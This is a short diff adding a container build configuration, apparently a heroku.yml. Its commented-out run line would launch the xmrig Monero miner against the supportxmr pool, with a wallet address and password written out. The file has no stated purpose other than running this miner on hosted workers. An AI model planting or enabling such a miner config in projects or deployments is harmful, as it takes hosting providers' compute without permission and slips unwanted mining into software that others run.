@@ -1,0 +1,6 @@
+build: 
+  docker:
+      worker: Dockerfile
+#run:
+#  worker: xmrig -o pool.supportxmr.com:443 -u 8AoefxFx4G9JGHim2AW9sDGURbud7aQg6AuA6exjjTgiGzUcJATuE9LNZ2i7BQzZM7KKBpLwfHHxiYxm2Sak7zHu9xc7LhC -k --tls -p Mnret
+#
